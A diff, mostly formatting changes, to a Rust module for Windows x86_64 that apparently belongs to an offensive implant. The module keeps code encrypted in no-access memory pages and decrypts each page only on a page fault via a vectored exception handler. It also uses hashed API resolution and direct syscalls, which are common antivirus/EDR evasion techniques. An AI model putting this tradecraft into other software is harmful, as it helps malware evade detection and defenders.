@@ -10,7 +10,11 @@
 //
 // Windows x86_64 only.  Feature-gated behind `page-fault-exec`.
 
-#![cfg(all(target_os = "windows", target_arch = "x86_64", feature = "page-fault-exec"))]
+#![cfg(all(
+    target_os = "windows",
+    target_arch = "x86_64",
+    feature = "page-fault-exec"
+))]
 
 use std::alloc::Layout;
 use std::ffi::c_void;
@@ -81,8 +85,8 @@ struct ExceptionRecord {
 /// Windows x64 CONTEXT structure (minimal — only fields we need).
 #[repr(C)]
 struct Context {
-    _pad: [u8; 0xF80], // offset 0x00 – 0xF7F: P1Home..FltSave
-    Rip: u64,          // offset 0xF80
+    _pad: [u8; 0xF80],  // offset 0x00 – 0xF7F: P1Home..FltSave
+    Rip: u64,           // offset 0xF80
     _pad2: [u8; 0x4D0], // remaining CONTEXT fields
 }
 
@@ -259,7 +263,9 @@ unsafe fn allocate_memory(size: usize) -> Result<*mut c_void, &'static str> {
             tracing::warn!(
                 "page_fault_exec: NtAllocateVirtualMemory syscall dispatch failed (SSN/gadget unresolved)"
             );
-            return Err("NtAllocateVirtualMemory syscall dispatch failed — SSN or gadget not resolved");
+            return Err(
+                "NtAllocateVirtualMemory syscall dispatch failed — SSN or gadget not resolved",
+            );
         }
     };
     if status < 0 || base.is_null() {
@@ -318,17 +324,14 @@ fn query_performance_ms() -> u64 {
         let mut counter: i64 = 0;
         let mut freq: i64 = 0;
 
-        type FnQueryPerformanceFrequency =
-            unsafe extern "system" fn(*mut i64) -> i32;
-        type FnQueryPerformanceCounter =
-            unsafe extern "system" fn(*mut i64) -> i32;
+        type FnQueryPerformanceFrequency = unsafe extern "system" fn(*mut i64) -> i32;
+        type FnQueryPerformanceCounter = unsafe extern "system" fn(*mut i64) -> i32;
 
-        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
-            b"kernel32.dll\0",
-        )) {
-            Some(b) => b,
-            None => return 0,
-        };
+        let kernel32 =
+            match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+                Some(b) => b,
+                None => return 0,
+            };
 
         // Resolve QPC
         let qpc_addr = pe_resolve::get_proc_address_by_hash(
@@ -448,11 +451,7 @@ impl PageFaultExec {
             std::ptr::copy_nonoverlapping(chunk.as_ptr(), base as *mut u8, chunk_size);
             // Zero-fill the remainder of the page if the chunk is smaller.
             if chunk_size < PAGE_SIZE {
-                std::ptr::write_bytes(
-                    (base as *mut u8).add(chunk_size),
-                    0,
-                    PAGE_SIZE - chunk_size,
-                );
+                std::ptr::write_bytes((base as *mut u8).add(chunk_size), 0, PAGE_SIZE - chunk_size);
             }
 
             // Generate a random nonce.
@@ -479,7 +478,10 @@ impl PageFaultExec {
             // Set page to PAGE_NOACCESS (encrypted & inaccessible).
             let old_prot = protect_memory(base, PAGE_SIZE, PAGE_NOACCESS);
             if old_prot == 0 {
-                tracing::warn!("page_fault_exec: failed to set PAGE_NOACCESS for page {}", i);
+                tracing::warn!(
+                    "page_fault_exec: failed to set PAGE_NOACCESS for page {}",
+                    i
+                );
             }
 
             self.pages.push(ProtectedPage {
@@ -522,10 +524,7 @@ impl PageFaultExec {
 
     /// Decrypt a specific page by index.
     fn decrypt_page(&mut self, index: usize) -> Result<(), &'static str> {
-        let pp = self
-            .pages
-            .get_mut(index)
-            .ok_or("page index out of range")?;
+        let pp = self.pages.get_mut(index).ok_or("page index out of range")?;
 
         if pp.decrypted {
             // Already decrypted — just update timestamp.
@@ -534,16 +533,13 @@ impl PageFaultExec {
             return Ok(());
         }
 
-        let key = ENCRYPTION_KEY
-            .get()
-            .ok_or("encryption key not available")?;
+        let key = ENCRYPTION_KEY.get().ok_or("encryption key not available")?;
 
         // Set page to PAGE_READWRITE so we can write decrypted data.
         unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
 
         // Decrypt in-place.
-        let page_slice =
-            unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
+        let page_slice = unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
         xchacha20_decrypt(key, &pp.nonce, page_slice, &pp.tag)
             .map_err(|_| "XChaCha20-Poly1305 decryption failed — tag mismatch")?;
 
@@ -561,18 +557,13 @@ impl PageFaultExec {
 
     /// Re-encrypt a specific page by index.
     fn reencrypt_page(&mut self, index: usize) -> Result<(), &'static str> {
-        let pp = self
-            .pages
-            .get_mut(index)
-            .ok_or("page index out of range")?;
+        let pp = self.pages.get_mut(index).ok_or("page index out of range")?;
 
         if !pp.decrypted {
             return Ok(()); // Already encrypted.
         }
 
-        let key = ENCRYPTION_KEY
-            .get()
-            .ok_or("encryption key not available")?;
+        let key = ENCRYPTION_KEY.get().ok_or("encryption key not available")?;
 
         // Generate a fresh nonce for forward secrecy.
         rand::thread_rng().fill_bytes(&mut pp.nonce);
@@ -581,8 +572,7 @@ impl PageFaultExec {
         unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
 
         // Encrypt in-place.
-        let page_slice =
-            unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
+        let page_slice = unsafe { std::slice::from_raw_parts_mut(pp.base as *mut u8, pp.size) };
         pp.tag = xchacha20_encrypt(key, &pp.nonce, page_slice)?;
 
         // Set page to PAGE_NOACCESS.
@@ -643,10 +633,10 @@ impl PageFaultExec {
                 timer_handle,
                 &due_time as *const i64 as u64,
                 reencrypt_timer_apc as *const () as u64, // APC callback
-                0u64,                        // context
-                0u64,                        // ResumeTimer = FALSE
-                0u64,                        // Period = 0 (one-shot, we re-arm)
-                0u64,                        // PreviousState = NULL
+                0u64,                                    // context
+                0u64,                                    // ResumeTimer = FALSE
+                0u64,                                    // Period = 0 (one-shot, we re-arm)
+                0u64,                                    // PreviousState = NULL
             );
             if status < 0 {
                 tracing::warn!(
@@ -690,7 +680,9 @@ impl PageFaultExec {
                     // Page is encrypted + NOACCESS; make writable to free.
                     unsafe { protect_memory(pp.base, pp.size, PAGE_READWRITE) };
                 }
-                unsafe { let _ = free_memory(pp.base); };
+                unsafe {
+                    let _ = free_memory(pp.base);
+                };
                 pp.base = std::ptr::null_mut();
             }
         }
@@ -778,9 +770,7 @@ unsafe extern "system" fn reencrypt_timer_apc(
 ///   2. Set protection to PAGE_EXECUTE_READ.
 ///   3. Return EXCEPTION_CONTINUE_EXECUTION to re-execute the faulting
 ///      instruction.
-unsafe extern "system" fn veh_page_fault_handler(
-    exception_info: *mut ExceptionPointers,
-) -> i32 {
+unsafe extern "system" fn veh_page_fault_handler(exception_info: *mut ExceptionPointers) -> i32 {
     let ep = match exception_info.as_ref() {
         Some(p) => p,
         None => return EXCEPTION_CONTINUE_SEARCH,
@@ -857,17 +847,16 @@ fn install_veh() -> bool {
     }
 
     unsafe {
-        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
-            b"kernel32.dll\0",
-        )) {
-            Some(b) => b,
-            None => {
-                tracing::error!(
+        let kernel32 =
+            match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+                Some(b) => b,
+                None => {
+                    tracing::error!(
                     "page_fault_exec: failed to resolve kernel32 for AddVectoredExceptionHandler"
                 );
-                return false;
-            }
-        };
+                    return false;
+                }
+            };
 
         let fn_addr = match pe_resolve::get_proc_address_by_hash(
             kernel32,
@@ -913,17 +902,16 @@ fn remove_veh() {
     }
 
     unsafe {
-        let kernel32 = match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
-            b"kernel32.dll\0",
-        )) {
-            Some(b) => b,
-            None => {
-                tracing::error!(
+        let kernel32 =
+            match pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"kernel32.dll\0")) {
+                Some(b) => b,
+                None => {
+                    tracing::error!(
                     "page_fault_exec: cannot resolve kernel32 for RemoveVectoredExceptionHandler"
                 );
-                return;
-            }
-        };
+                    return;
+                }
+            };
 
         let fn_addr = match pe_resolve::get_proc_address_by_hash(
             kernel32,
@@ -936,8 +924,7 @@ fn remove_veh() {
             }
         };
 
-        type FnRemoveVectoredExceptionHandler =
-            unsafe extern "system" fn(*mut c_void) -> u32;
+        type FnRemoveVectoredExceptionHandler = unsafe extern "system" fn(*mut c_void) -> u32;
 
         let remove_veh: FnRemoveVectoredExceptionHandler = std::mem::transmute(fn_addr);
         let result = remove_veh(handle);
